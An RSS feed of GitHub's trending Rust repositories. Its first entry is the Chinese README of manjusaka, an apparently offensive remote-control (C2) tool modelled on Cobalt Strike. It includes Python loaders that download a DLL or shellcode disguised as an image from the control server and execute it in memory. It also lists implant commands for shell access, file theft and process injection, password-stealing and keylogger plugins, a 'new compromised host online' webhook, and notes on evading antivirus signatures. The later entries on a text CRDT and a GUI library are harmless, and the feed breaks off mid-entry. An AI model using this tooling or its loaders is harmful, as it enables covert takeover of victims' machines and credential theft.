<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Rust Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-09-06T01:37:16Z</updated>
  <subtitle>Daily Trending of Rust in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>YDHCUI/manjusaka</title>
    <updated>2023-09-06T01:37:16Z</updated>
    <id>tag:github.com,2023-09-06:/YDHCUI/manjusaka</id>
    <link href="https://github.com/YDHCUI/manjusaka" rel="alternate"></link>
    <summary type="html">&lt;p&gt;牛屎花 一款基于WEB界面的远程主机管理工具&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;免责声明&lt;/h1&gt; &#xA;&lt;p&gt;本工具仅面向合法授权的企业安全建设行为，如您需要测试本工具的可用性，请自行搭建靶机环境。&lt;/p&gt; &#xA;&lt;p&gt;在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。请勿对非授权目标进行扫描。&lt;/p&gt; &#xA;&lt;p&gt;此工具仅限于安全研究和教学，用户承担因使用此工具而导致的所有法律和相关责任！ 作者不承担任何法律和相关责任！&lt;/p&gt; &#xA;&lt;p&gt;如您在使用本工具的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。&lt;/p&gt; &#xA;&lt;h1&gt;manjusaka&lt;/h1&gt; &#xA;&lt;p&gt;牛屎花 一款基于WEB界面的仿CobaltStrike C2远控&lt;/p&gt; &#xA;&lt;p&gt;##系统架构： &lt;img src=&#34;https://github.com/YDHCUI/manjusaka/raw/main/images/0.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;使用方法&lt;/h2&gt; &#xA;&lt;p&gt;配置conf.toml 运行主文件&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[root@devops nps]# ./manjusaka&#xA;[NPS] 2022/09/14 15:57:21 初始用户: manjusaka  密码: ZbFCa2L2LRd5&#xA;[NPS] 2022/09/14 15:57:21 创建项目: 公共项目 没有归属的npc放在这个项目里面&#xA;[NPS] 2022/09/14 15:57:21 监听项目路由: VHOS5vqN&#xA;[NPS] 2022/09/14 15:57:21 NPS监听地址 :3200&#xA;[NPS] 2022/09/14 15:57:21 NPU后台地址 : manjusaka&#xA;[NPS] 2022/09/14 15:57:21 NPC监听地址 :801&#xA;[NPS] 2022/09/14 15:57:21 NPC交互路由 : /:target/favicon.ico&#xA;[NPS] 2022/09/14 15:57:21 NPC下载路由 : /:target/assert/:sys/bg.jpg&#xA;[NPS] 2022/09/14 15:57:21 NPC文件路由 : /images/:fid/logo.png&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;则NPS访问地址为 &lt;a href=&#34;http://192.168.93.217:3200/manjusaka&#34;&gt;http://192.168.93.217:3200/manjusaka&lt;/a&gt;&lt;br&gt; 账号密码见初始日志，每个人生成的密码及默认路由都不一样 如需修改 请自行编辑nps.db文件&lt;/p&gt; &#xA;&lt;p&gt;1、创建项目，默认有一个公共项目，通过项目【状态】开关可以控制项目是否启用状态。选择当前项目后 可在回传结果里面查看当前项目回传的信息。&lt;/p&gt; &#xA;&lt;p&gt;新建项目 配置需要填写以下项：&lt;/p&gt; &#xA;&lt;p&gt;项目名称: 随便写 如 hvv2022&lt;/p&gt; &#xA;&lt;p&gt;回调地址: 外网IP和端口 &lt;a href=&#34;http://12.34.56.78:8080&#34;&gt;http://12.34.56.78:8080&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;上线域名: cdn域名 如 &lt;a href=&#34;http://imagecdn2.alicdn.com&#34;&gt;http://imagecdn2.alicdn.com&lt;/a&gt; 如果没有上cdn则填写和回调地址一样&lt;/p&gt; &#xA;&lt;p&gt;Host头 : cdn上线时所需要的host请求头 如 update.baiduimage.com 默认为上线域名&lt;/p&gt; &#xA;&lt;p&gt;代理地址: NPC上线时如果需要走代理，在这里配置。比如我测试用的clash，代理配置为&lt;a href=&#34;http://192.168.93.1:7890&#34;&gt;http://192.168.93.1:7890&lt;/a&gt; 详见：&lt;a href=&#34;https://docs.rs/reqwest/0.11.16/reqwest/struct.Proxy.html&#34;&gt;https://docs.rs/reqwest/0.11.16/reqwest/struct.Proxy.html&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;其它都会默认生成，点击确定更新之后需要刷新列表重新启用项目状态。&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/YDHCUI/manjusaka/raw/main/images/1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;2、根据项目 生成npc 可以直接使用exe或elf格式的npc。也可以使用其它语言加载npc母体 比如使用python加载npc母体dll&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import requests&#xA;from ctypes import cdll&#xA;res = requests.get(&#34;http://192.168.93.217:801/bq1iFEP2/assert/dll/x64/bg.jpg&#34;)&#xA;with open(&#34;a.dll&#34;,&#34;wb&#34;) as f:&#xA;    f.write(res.content)&#xA;cdll.LoadLibrary(&#34;a.dll&#34;).main()&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;或者使用shellcode内存加载的形式&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import requests&#xA;import ctypes&#xA;shellcode = requests.get(&#34;http://192.168.93.217:801/bq1iFEP2/assert/bin/x64/bg.jpg&#34;).content&#xA;rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)&#xA;ctypes.windll.kernel32.RtlMoveMemory(rwxpage, shellcode, len(shellcode))&#xA;handle = ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)&#xA;ctypes.windll.kernel32.WaitForSingleObject(handle, -1)&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/YDHCUI/manjusaka/raw/main/images/2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;3、npc上线，点选中该npc即可对其进行操作， 输入help可查看帮助。目前支持的操作命令如下：&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;help      打印帮助 &#xA;ps        查看进程 eg: ps&#xA;ss        查看网络连接 eg: ss&#xA;ls        枚举文件 eg: ls /&#xA;cd        切换目录 eg: cd / &#xA;sh        执行系统命令  eg: sh ps -aux  , sh tasklist  &#xA;cat       读取文本 cat a.txt&#xA;screen    执行截屏 screen&#xA;wget      下载文件 eg: wget http://192.168.1.1/a.txt &amp;lt;a.txt&amp;gt;    文件名可选 默认当前  &#xA;put       上传文件 eg: put /etc/passwd                          将passwd文件上传到nps服务器  &#xA;start     执行插件可执行文件 eg: start name &amp;lt;args&amp;gt;               需要可执行文件在plugins目录下 会自动把插件传到目标机器上面&#xA;pl        执行插件 eg: pl plugname &amp;lt;plugargs&amp;gt;                   需要插件在plugins目录下 &#xA;inject    注入进程 eg: inject pid &amp;lt;shellcodeurl&amp;gt;                shellcodeurl可选 默认下载当前shellcode下载链接 &#xA;&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/YDHCUI/manjusaka/raw/main/images/3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/YDHCUI/manjusaka/raw/main/images/4.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/YDHCUI/manjusaka/raw/main/images/5.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/YDHCUI/manjusaka/raw/main/images/6.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/YDHCUI/manjusaka/raw/main/images/7.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/YDHCUI/manjusaka/raw/main/images/8.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;4、插件系统 分为第三方程序的调用和内置插件&lt;/p&gt; &#xA;&lt;p&gt;插件可在conf中配置默认启动参数，示例中有一个getpass插件 默认参数为all&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;[plug.getpass]&#xA;args = &#34;all&#34;&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;第三方程序的调用 比如现在我想将doglite作为插件启动&lt;/p&gt; &#xA;&lt;p&gt;则需要将doglite命名为plug_doglite_nps.exe放入plugins文件夹并在conf中配置参数如下&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;[plug.doglite]&#xA;args = &#34;-service xx.xx.xx.xx:xx -action socks5  -local :40004 -r&#34;&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;在信息页点选该插件运行，或在命令行输入 start doglite 即可启动该插件。&lt;/p&gt; &#xA;&lt;p&gt;内置插件，生成dll/so插件, 以plug_name_nps.dll格式命名放到plugins文件夹下面 在命令行输入 pl getpass 即可动态调用&lt;/p&gt; &#xA;&lt;p&gt;插件开发示例, plugmain传入插件运行参数 传出返回的内容值&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-rust&#34;&gt;//./Cargo.toml&#xA;&#xA;[lib]&#xA;path = &#34;src/lib.rs&#34;&#xA;crate-type = [&#34;cdylib&#34;]&#xA;&#xA;&#xA;//src/lib.rs&#xA;&#xA;use std::ffi::CStr;&#xA;use std::ffi::CString;&#xA;use std::os::raw::c_char;&#xA;&#xA;use protobuf::Message;&#xA;use protobuf::RepeatedField;&#xA;&#xA;#[no_mangle]&#xA;pub unsafe extern &#34;C&#34; fn plugmain(args: *const c_char) -&amp;gt; *const c_char { &#xA;    let args = CStr::from_ptr(args).to_str().unwrap();&#xA;&#xA;    let mut prs = Vec::&amp;lt;plug::PassResult&amp;gt;::new();&#xA;    prs.push(plug::PassResult::new());&#xA;    &#xA;    let mut gret = plug::PlugResult{&#xA;        name: &#34;test&#34;.to_string(),&#xA;        args: args.to_string(),&#xA;        resulttype: plug::ResultType::PASSRET,&#xA;        ..Default::default()&#xA;    };&#xA;    gret.set_passresult(RepeatedField::from_vec(prs));&#xA;&#xA;    let c_str = gret.write_to_bytes().expect(&#34;protobuf to bytes err&#34;);&#xA;&#xA;&#xA;    CString::new(c_str).expect(&#34;CString failed&#34;).into_raw()&#xA;}&#xA;&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;返回值匹配到如下protobuf格式后后将结果写入数据库&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-protobuf&#34;&gt;&#xA;syntax = &#34;proto3&#34;;&#xA;&#xA;&#xA;enum ResultType {&#xA;    PASSRET = 0;&#xA;    PORTRET = 1;&#xA;    HTTPRET = 2;&#xA;}&#xA;&#xA;message PassResult {&#xA;    string username = 1;&#xA;    string password = 2;&#xA;    string passtype = 3;&#xA;    string passfrom = 4;&#xA;}&#xA;&#xA;message PortResult {&#xA;    string host = 1;&#xA;    int32 port = 2;&#xA;    string proto = 3;&#xA;    string version = 4;&#xA;}&#xA;&#xA;message HttpResult {&#xA;    string proto = 1;&#xA;    string host = 2;&#xA;    int32 port = 3;&#xA;    string title = 4;&#xA;    string note = 5;&#xA;}&#xA;&#xA;message PlugResult {&#xA;    string name = 1;&#xA;    string args = 2;&#xA;    ResultType resulttype = 3;&#xA;    repeated PassResult passresult = 11;&#xA;    repeated PortResult portresult = 12;&#xA;    repeated HttpResult httpresult = 13;&#xA;}&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;5、 上线提醒功能，需要在conf里面配置一下webhook。&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;[webhook] &#xA;method = &#34;POST&#34; &#xA;url = &#34;https://wxpusher.zjiecode.com/api/send/message&#34;&#xA;headers = &#34;Content-Type:application/json&#34; #多个header以\n分割&#xA;body = &#34;&#34;&#34;{&#xA;  &#34;appToken&#34;:&#34;AT_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#34;,&#xA;  &#34;content&#34;:&#34;{Projname} {Projroute}  \\n{Username} {Hostname}  \\n{Intranet} {Internet}  \\n{Pid} {Process}&#34;,&#xA;  &#34;summary&#34;:&#34;您有新的肉鸡上线啦！{Username} {Hostname}&#34;,&#xA;  &#34;contentType&#34;:3,&#xA;  &#34;uids&#34;:[&#34;UID_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#34;]}&#34;&#34;&#34;&#xA;&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;demo里用的是wxpusher的方案，可以自己改 但是目前只支持POST模式。&lt;/p&gt; &#xA;&lt;p&gt;body里面的模板支持以下变量(注意:变量为未经过滤的原始字符，可能存在xss风险。)&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;{Id}&#xA;{Target}&#xA;{Intranet}&#xA;{Username}&#xA;{Hostname}&#xA;{Platform}&#xA;{Process}&#xA;{Pid}&#xA;{Systype}&#xA;{Internet}&#xA;{Note}&#xA;{Projname}&#xA;{Projroute}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;更新&lt;/h2&gt; &#xA;&lt;h3&gt;v0.9&lt;/h3&gt; &#xA;&lt;p&gt;2、去除了npc获取公网地址项。。。(容易报毒)。&lt;/p&gt; &#xA;&lt;p&gt;3、支持socks5代理上线，修改加密算法为aes。 修改npu推送间隔为60s。&lt;/p&gt; &#xA;&lt;p&gt;4、修复npc列表界面位移，支持备注功能。&lt;/p&gt; &#xA;&lt;p&gt;5、去除了没啥卵用的功能，修复其它bug。&lt;/p&gt; &#xA;&lt;h3&gt;v0.8&lt;/h3&gt; &#xA;&lt;p&gt;1、获取真实公网地址、并展示IP归属 , 密码加密，上线提醒功能&lt;/p&gt; &#xA;&lt;p&gt;2、支持cdn上线，加入代理上线功能 修复host头问题&lt;/p&gt; &#xA;&lt;p&gt;3、默认获取所有历史npc上线列表&lt;/p&gt; &#xA;&lt;p&gt;4、修复其它bug&lt;/p&gt; &#xA;&lt;h3&gt;v0.7&lt;/h3&gt; &#xA;&lt;p&gt;1、新增shellcode加载方式，新增系统位数区分&lt;/p&gt; &#xA;&lt;p&gt;2、去除nps db的agents表, 使用内存记录npc列表 将进程名称改为进程全路径&lt;/p&gt; &#xA;&lt;p&gt;3、优化npu推送模式, 修复大量npc时的npu卡顿问题&lt;/p&gt; &#xA;&lt;p&gt;4、新增进程注入命令 简单实现 CopySelf&lt;/p&gt; &#xA;&lt;p&gt;5、配置文件加密，配置分阶段加载。&lt;/p&gt; &#xA;&lt;p&gt;6、去除了没啥用的功能&lt;/p&gt; &#xA;&lt;h3&gt;v0.6&lt;/h3&gt; &#xA;&lt;p&gt;1、插件支持可执行文件&lt;/p&gt; &#xA;&lt;p&gt;2、修复文件上传跨域bug&lt;/p&gt; &#xA;&lt;p&gt;3、登录验证码，cookie时效机制&lt;/p&gt; &#xA;&lt;p&gt;4、修复sh 执行命令不能加参数的bug&lt;/p&gt; &#xA;&lt;p&gt;5、优化npc体积&lt;/p&gt; &#xA;&lt;p&gt;6、更新kzta 系统密码读取插件，更新qvte键盘记录插件&lt;/p&gt; &#xA;&lt;h3&gt;v0.5&lt;/h3&gt; &#xA;&lt;p&gt;1、修复安全漏洞&lt;/p&gt; &#xA;&lt;p&gt;2、开放NPC配置修改功能&lt;/p&gt; &#xA;&lt;p&gt;3、上传文件流程优化&lt;/p&gt; &#xA;&lt;p&gt;4、增加动态插件功能，可拓展更多功能&lt;/p&gt; &#xA;&lt;p&gt;5、去除特征、修复bug&lt;/p&gt; &#xA;&lt;h3&gt;v0.4&lt;/h3&gt; &#xA;&lt;p&gt;1、随机key&lt;/p&gt; &#xA;&lt;p&gt;2、去除特征、修复bug&lt;/p&gt; &#xA;&lt;h3&gt;v0.3&lt;/h3&gt; &#xA;&lt;p&gt;1、实现截屏、密码获取功能。(仅window)&lt;/p&gt; &#xA;&lt;p&gt;2、修复cmd界面不能黏贴的bug。&lt;/p&gt; &#xA;&lt;p&gt;3、修复项目不能暂停的bug。&lt;/p&gt; &#xA;&lt;p&gt;4、自动创建data文件夹。&lt;/p&gt; &#xA;&lt;h3&gt;v0.2&lt;/h3&gt; &#xA;&lt;p&gt;1、修改网络协议使流量加密。&lt;/p&gt; &#xA;&lt;p&gt;2、加入本地文件上传下载功能。&lt;/p&gt; &#xA;&lt;p&gt;3、修复shell界面位移bug。&lt;/p&gt; &#xA;&lt;h3&gt;v0.1&lt;/h3&gt; &#xA;&lt;p&gt;1、实现基础远控功能。&lt;/p&gt; &#xA;&lt;h2&gt;交流&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://discord.gg/YMqeN5Qyk4&#34;&gt;https://discord.gg/YMqeN5Qyk4&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/46884495/230539421-366acb18-77db-48b7-8ffd-982f59d3ea6f.jpg&#34; alt=&#34;f00026c92f3353c468ed6e97276f52f&#34;&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>nomad/cola</title>
    <updated>2023-09-06T01:37:16Z</updated>
    <id>tag:github.com,2023-09-06:/nomad/cola</id>
    <link href="https://github.com/nomad/cola" rel="alternate"></link>
    <summary type="html">&lt;p&gt;🥤 A text CRDT for real-time collaborative editing&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;🥤 cola&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/nomad/cola/actions&#34;&gt;&lt;img src=&#34;https://github.com/nomad/cola/actions/workflows/ci.yml/badge.svg?sanitize=true&#34; alt=&#34;CI&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://crates.io/crates/cola-crdt&#34;&gt;&lt;img src=&#34;https://img.shields.io/crates/v/cola-crdt.svg?sanitize=true&#34; alt=&#34;Latest version&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://docs.rs/cola-crdt&#34;&gt;&lt;img src=&#34;https://docs.rs/cola-crdt/badge.svg?sanitize=true&#34; alt=&#34;Docs badge&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;cola is a Conflict-free Replicated Data Type specialized for real-time collaborative editing of plain text documents.&lt;/p&gt; &#xA;&lt;p&gt;It allows multiple peers on a distributed network to concurrently edit the same text document, making sure that they all converge to the same final state without relying on a central server to coordinate the edits.&lt;/p&gt; &#xA;&lt;p&gt;Check out &lt;a href=&#34;https://docs.rs/cola-crdt&#34;&gt;the docs&lt;/a&gt; to learn about cola&#39;s API, or &lt;a href=&#34;https://nomad.foo/blog/cola&#34;&gt;this blog post&lt;/a&gt; for a deeper dive into its design and implementation.&lt;/p&gt; &#xA;&lt;h2&gt;Example usage&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-rust&#34;&gt;use std::ops::Range;&#xA;&#xA;use cola::{Deletion, Replica, ReplicaId};&#xA;&#xA;struct Document {&#xA;    buffer: String,&#xA;    crdt: Replica,&#xA;}&#xA;&#xA;struct Insertion {&#xA;    text: String,&#xA;    crdt: cola::Insertion,&#xA;}&#xA;&#xA;impl Document {&#xA;    fn new&amp;lt;S: Into&amp;lt;String&amp;gt;&amp;gt;(text: S, replica_id: ReplicaId) -&amp;gt; Self {&#xA;        let buffer = text.into();&#xA;        let crdt = Replica::new(replica_id, buffer.len());&#xA;        Document { buffer, crdt }&#xA;    }&#xA;&#xA;    fn fork(&amp;amp;self, new_replica_id: ReplicaId) -&amp;gt; Self {&#xA;        let crdt = self.crdt.fork(new_replica_id);&#xA;        Document { buffer: self.buffer.clone(), crdt }&#xA;    }&#xA;&#xA;    fn insert&amp;lt;S: Into&amp;lt;String&amp;gt;&amp;gt;(&#xA;        &amp;amp;mut self,&#xA;        insert_at: usize,&#xA;        text: S,&#xA;    ) -&amp;gt; Insertion {&#xA;        let text = text.into();&#xA;        self.buffer.insert_str(insert_at, &amp;amp;text);&#xA;        let insertion = self.crdt.inserted(insert_at, text.len());&#xA;        Insertion { text, crdt: insertion }&#xA;    }&#xA;&#xA;    fn delete(&amp;amp;mut self, range: Range&amp;lt;usize&amp;gt;) -&amp;gt; Deletion {&#xA;        self.buffer.replace_range(range.clone(), &#34;&#34;);&#xA;        self.crdt.deleted(range)&#xA;    }&#xA;&#xA;    fn integrate_insertion(&amp;amp;mut self, insertion: Insertion) {&#xA;        if let Some(offset) = self.crdt.integrate_insertion(&amp;amp;insertion.crdt) {&#xA;            self.buffer.insert_str(offset, &amp;amp;insertion.text);&#xA;        }&#xA;    }&#xA;&#xA;    fn integrate_deletion(&amp;amp;mut self, deletion: Deletion) {&#xA;        let ranges = self.crdt.integrate_deletion(&amp;amp;deletion);&#xA;        for range in ranges.into_iter().rev() {&#xA;            self.buffer.replace_range(range, &#34;&#34;);&#xA;        }&#xA;    }&#xA;}&#xA;&#xA;fn main() {&#xA;    let mut peer_1 = Document::new(&#34;Hello, world&#34;, 1);&#xA;    let mut peer_2 = peer_1.fork(2);&#xA;&#xA;    let delete_comma = peer_1.delete(5..6);&#xA;    let insert_exclamation = peer_2.insert(12, &#34;!&#34;);&#xA;&#xA;    peer_1.integrate_insertion(insert_exclamation);&#xA;    peer_2.integrate_deletion(delete_comma);&#xA;&#xA;    assert_eq!(peer_1.buffer, &#34;Hello world!&#34;);&#xA;    assert_eq!(peer_2.buffer, &#34;Hello world!&#34;);&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h1&gt;A note on the crate&#39;s naming scheme&lt;/h1&gt; &#xA;&lt;p&gt;cola&#39;s &lt;code&gt;package.name&lt;/code&gt; is &lt;code&gt;cola-crdt&lt;/code&gt;, while its &lt;code&gt;lib.name&lt;/code&gt; is simply &lt;code&gt;cola&lt;/code&gt;. This is because the package name has to be unique to be published to &lt;a href=&#34;https://crates.io&#34;&gt;crates.io&lt;/a&gt;, but unfortunately &lt;code&gt;cola&lt;/code&gt; is already taken by a crate squatter.&lt;/p&gt; &#xA;&lt;p&gt;What this means practically for you, the user of the library, is that you should import cola as &lt;code&gt;cola-crdt&lt;/code&gt; in your &lt;code&gt;Cargo.toml&lt;/code&gt;, and &lt;code&gt;use&lt;/code&gt; it as &lt;code&gt;cola&lt;/code&gt; in your source code.&lt;/p&gt; &#xA;&lt;p&gt;For example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-toml&#34;&gt;# Cargo.toml&#xA;[dependencies]&#xA;cola-crdt = &#34;0.1&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-rust&#34;&gt;// main.rs&#xA;use cola::Replica;&#xA;&#xA;fn main() {&#xA;    println!(&#34;{:?}&#34;, Replica::new(1, 42));&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
  </entry>
  <entry>
    <title>marc2332/freya</title>
    <updated>2023-09-06T01:37:16Z</updated>
    <id>tag:github.com,2023-09-06:/marc2332/freya</id>
    <link href="https://github.com/marc2332/freya" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Native GUI library for 🦀 Rust powered by 🧬 Dioxus and 🎨 Skia.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Freya 🦀&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://freyaui.dev/&#34;&gt;&lt;img align=&#34;right&#34; src=&#34;https://raw.githubusercontent.com/marc2332/freya/main/logo.svg?sanitize=true&#34; alt=&#34;Freya logo&#34; width=&#34;150&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://discord.gg/sYejxCdewG&#34;&gt;&lt;img src=&#34;https://img.shields.io/discord/1015005816094478347.svg?logo=discord&amp;amp;style=flat-square&#34; alt=&#34;Discord Server&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/sponsors/marc2332&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/sponsors/marc2332?style=social&#34; alt=&#34;Github Sponsors&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://codecov.io/github/marc2332/freya&#34;&gt;&lt;img src=&#34;https://codecov.io/github/marc2332/freya/branch/main/graph/badge.svg?token=APSGEC84B8&#34; alt=&#34;codecov&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://freyaui.dev&#34;&gt;Website&lt;/a&gt; | &lt;a href=&#34;https://docs.freyaui.dev/freya&#34;&gt;Nightly Docs&lt;/a&gt; | &lt;a href=&#34;https://docs.rs/freya/latest/freya&#34;&gt;Stable Docs&lt;/a&gt; | &lt;a href=&#34;https://book.freyaui.dev&#34;&gt;Book&lt;/a&gt; | &lt;a href=&#34;https://discord.gg/sYejxCdewG&#34;&gt;Discord&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Freya&lt;/strong&gt; is a native GUI library for Rust powered by 🧬 &lt;a href=&#34;https://dioxuslabs.com&#34;&gt;Dioxus&lt;/a&gt; and 🎨 &lt;a href=&#34;https://skia.org/&#34;&gt;Skia&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;⚠️ It&#39;s currently work in progress and not usable for production, but you can already play with it! You can join the &lt;a href=&#34;https://discord.gg/sYejxCdewG&#34;&gt;Discord&lt;/a&gt; server if you have any question or issue.&lt;/p&gt; &#xA;&lt;br&gt; &#xA;&lt;br&gt; &#xA;&lt;table&gt; &#xA; &lt;tbody&gt;&#xA;  &lt;tr&gt; &#xA;   &lt;td style=&#34;border:hidden;&#34;&gt; &lt;pre&gt;&lt;code class=&#34;language-rust,&#34;&gt;fn app(cx: Scope) -&amp;gt; Element {&#xA;    let mut count = use_state(cx, || 0);&#xA;&#xA;    render!(&#xA;        rect {&#xA;            height: &#34;20%&#34;,&#xA;            width: &#34;100%&#34;,&#xA;            background: &#34;rgb(233, 196, 106)&#34;,&#xA;            padding: &#34;12&#34;,&#xA;            color: &#34;rgb(20, 33, 61)&#34;,&#xA;            label { &#xA;                font_size: &#34;20&#34;, &#xA;                &#34;Number is: {count}&#34;&#xA;            }&#xA;        }&#xA;        rect {&#xA;            height: &#34;80%&#34;,&#xA;            width: &#34;100%&#34;,&#xA;            background: &#34;rgb(168, 218, 220)&#34;,&#xA;            color: &#34;black&#34;,&#xA;            padding: &#34;12&#34;,&#xA;            onclick: move |_| count += 1,&#xA;            label { &#34;Click to increase!&#34; }&#xA;        }&#xA;    )&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/td&gt; &#xA;   &lt;td style=&#34;border:hidden;&#34;&gt; &lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/marc2332/freya/main/demo.png&#34; alt=&#34;Freya&#34;&gt;&lt;/p&gt; &lt;/td&gt; &#xA;  &lt;/tr&gt;&#xA; &lt;/tbody&gt;&#xA;&lt;/table&gt; &#xA;&lt;h3&gt;Want to try it? 🤔&lt;/h3&gt; &#xA;&lt;p&gt;⚠️ First, see &lt;a href=&#34;https://book.freyaui.dev/setup.html&#34;&gt;Environment setup&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Clone this repo and run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;cargo run --example counter&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can also try &lt;a href=&#34;https://github.com/marc2332/freya-template&#34;&gt;&lt;code&gt;freya-template&lt;/code&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Usage 📜&lt;/h3&gt; &#xA;&lt;p&gt;Add Freya and Dioxus as dependencies:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-toml&#34;&gt;freya = &#34;0.1&#34;&#xA;dioxus = { version = &#34;0.4&#34;, features = [&#34;macro&#34;, &#34;hooks&#34;] }&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Features ✨&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;⛏️ Built-in &lt;strong&gt;components&lt;/strong&gt; (button, scroll views, switch and more)&lt;/li&gt; &#xA; &lt;li&gt;🚇 Built-in &lt;strong&gt;hooks&lt;/strong&gt; library (animations, text editing and more)&lt;/li&gt; &#xA; &lt;li&gt;🔍 Built-in &lt;strong&gt;devtools&lt;/strong&gt; panel (experimental ⚠️) (experimental ⚠️)&lt;/li&gt; &#xA; &lt;li&gt;🧰 Built-in &lt;strong&gt;headless testing&lt;/strong&gt; runner for components&lt;/li&gt; &#xA; &lt;li&gt;🎨 &lt;strong&gt;Theming&lt;/strong&gt; support (not extensible yet ⚠️)&lt;/li&gt; &#xA; &lt;li&gt;🛩️ Cross-platform (Windows, Linux, MacOS)&lt;/li&gt; &#xA; &lt;li&gt;🖼️ SKSL &lt;strong&gt;Shaders&lt;/strong&gt; support&lt;/li&gt; &#xA; &lt;li&gt;🔄️ Dioxus &lt;strong&gt;Hot-reload&lt;/strong&gt; support&lt;/li&gt; &#xA; &lt;li&gt;📒 Multi-line &lt;strong&gt;text editing&lt;/strong&gt; (experimental ⚠️)&lt;/li&gt; &#xA; &lt;li&gt;🦾 Basic &lt;strong&gt;Accessibility&lt;/strong&gt; Support (experimental ⚠️)&lt;/li&gt; &#xA; &lt;li&gt;🧩Compatible with 